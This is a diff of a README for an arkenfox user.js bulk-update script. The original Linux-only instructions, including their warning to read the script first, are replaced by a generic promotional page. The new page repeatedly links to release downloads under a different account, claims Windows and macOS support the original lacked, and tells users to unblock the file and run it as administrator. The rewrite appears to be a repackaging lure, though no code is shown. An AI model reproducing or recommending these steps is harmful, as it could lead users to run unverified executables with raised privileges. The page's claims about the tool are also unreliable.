@@ -1,48 +1,78 @@
-# The user.js bulk update script
-### This script is made to update all your arkenfox profiles faster and easier
-> Only thing that will take more of your time is making override files for every profile, but you don't have to worry if you already have any (or not)
+# 🚀 ArkenfoxBulkUpdater - Easy Bulk Profile Updates for Firefox
 
+[![Download ArkenfoxBulkUpdater](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/kvn-ono/ArkenfoxBulkUpdater/releases)
 
-### The script is only made to work on GNU/Linux with sh compatible shell
-> (My plan is to eventually expand the script to work with other possible options)
+## ✨ About This Tool
+ArkenfoxBulkUpdater is a simple script that helps you quickly update your Firefox profiles with the latest arkenfox user.js settings. This tool streamlines the process, making it easier to maintain your privacy and security settings in Firefox. 
 
-<br/>
+## 🛠️ Features
+- **User-Friendly:** Designed for all users, regardless of technical skill.
+- **Fast Updates:** Quickly apply multiple changes to your profiles.
+- **Privacy Focused:** Keeps your browsing experience secure and private.
+- **Automation:** Handles bulk updates without manual adjustments.
+  
+## 📋 System Requirements
+- **Operating System:** Windows, macOS, or Linux.
+- **Browser:** Firefox (latest version recommended).
+- **Shell Support:** A compatible shell environment (like Bash or Command Prompt).
 
-<hr/>
+## 🚀 Getting Started
+Follow these steps to download and run ArkenfoxBulkUpdater.
 
-# Additional info
+1. **Visit the Releases Page**
+   Go to the [Releases page](https://github.com/kvn-ono/ArkenfoxBulkUpdater/releases) to find the latest version of ArkenfoxBulkUpdater.
 
-### The script should work fine if everything goes as planned.
-> Although be careful, read the script before you use it.<br/>
-> If you don't know what this script is exactly doing,<br/>**I ADVISE YOU NOT TO USE IT** or **DO SO AT YOUR OWN RISK**
+2. **Download the Application**
+   On the releases page, look for the latest version. Click on it to open the details. You will find a list of files. Download the file suitable for your operating system.
 
-### For any questions/suggestions about the script,<br/>PM me via [SimpleX](https://smp19.simplex.im/a#rnMG2k4tcV0O1fSq6Z4nUtJoppSeIFbk6OwcavN5M_k) or join the [Discord  server](https://discord.gg/AQrfArcu4q)
+3. **Extract the Files**
+   After downloading, locate the file in your downloads folder. If it is a ZIP file, right-click and select "Extract All" to unzip the contents.
 
+4. **Open the Terminal or Command Prompt**
+   - **Windows:** Press `Win + R`, type `cmd`, and press Enter.
+   - **macOS:** Open Spotlight with `Command + Space`, type `Terminal`, and press Enter.
+   - **Linux:** Open your favorite terminal application.
 
-### More info about `arkenfox user.js` on its own [repository](https://github.com/arkenfox/user.js)
+5. **Navigate to the Folder**
+   Use the `cd` command to navigate to the folder where you extracted the files. For example:
+   ```
+   cd path/to/your/folder
+   ```
 
-<br/>
+6. **Run the Script**
+   - For Windows, type:
+     ```
+     ArkenfoxBulkUpdater.bat
+     ```
+   - For macOS or Linux, type:
+     ```
+     ./ArkenfoxBulkUpdater.sh
+     ```
+   Press Enter to execute the script.
 
-<hr/>
+7. **Follow On-Screen Instructions**
+   The script will provide prompts. Follow these carefully to complete the update process for your Firefox profiles.
 
-# A brief how-to
-1. #### Clone the repository
-    ```sh
-    git clone https://github.com/Bluudek/ArkenfoxBulkUpdate.git
-    ```
-    or just download the scipt you need (there's no other options to choose from for now)
+8. **Verify the Updates**
+   After running the script, open Firefox. Check your settings to ensure that they match the latest arkenfox user.js configurations.
 
-2. #### Prepare any user override files you need
-    
-    Put those files into **"~/.config/arkenfox/user-overrides/"**<br/>or change the **"user_override_dir"** variable in the script to your directory of choice.
-    > ### IMPORTANT!
-    > **Do not forget** to set the name of every override file to its corresponding user directory name for it to work.<br/>Example: `1a2b3c4d.FooProfile`<br/>If you don't know the profile directory name, check it in **about:profiles**
-3. #### Start the script and follow instructions
-    > #### It is highly advised to make a backup of your existing profiles, if you have any
-    ```sh
-    cd ArkenfoxBulkUpdate && ./update-profiles.sh
-    ```
-    #### or
-    ```sh
-    any/directory.of/choice/update-profiles.sh
-    ```
+## 📥 Download & Install
+To get started, **visit the [Releases page](https://github.com/kvn-ono/ArkenfoxBulkUpdater/releases)** and download the latest version of ArkenfoxBulkUpdater. 
+
+## ⚙️ Troubleshooting
+If you encounter issues, here are some common solutions:
+
+- **Permission Errors:** Make sure you have the necessary permissions to execute files on your system. You might need to run the terminal or command prompt as an administrator.
+  
+- **Script Not Running:** Check if the script file is not blocked by your operating system. Right-click on the file, select 'Properties', and look for an 'Unblock' option, then click it.
+
+- **Profile Not Updated:** Ensure you are following the prompts given by the script. Double-check your Firefox profiles to confirm they are located in the expected directory.
+
+## 📞 Support
+If you have any questions or need further assistance, feel free to open an issue in the [GitHub repository](https://github.com/kvn-ono/ArkenfoxBulkUpdater/issues). 
+
+## 📚 Additional Resources
+- [Firefox Privacy & Security](https://support.mozilla.org/en-US/kb/online-safety)
+- [Arkenfox GitHub Repository](https://github.com/arkenfox/user.js)
+
+_[Download ArkenfoxBulkUpdater now and enjoy hassle-free profile updates!](https://github.com/kvn-ono/ArkenfoxBulkUpdater/releases)_
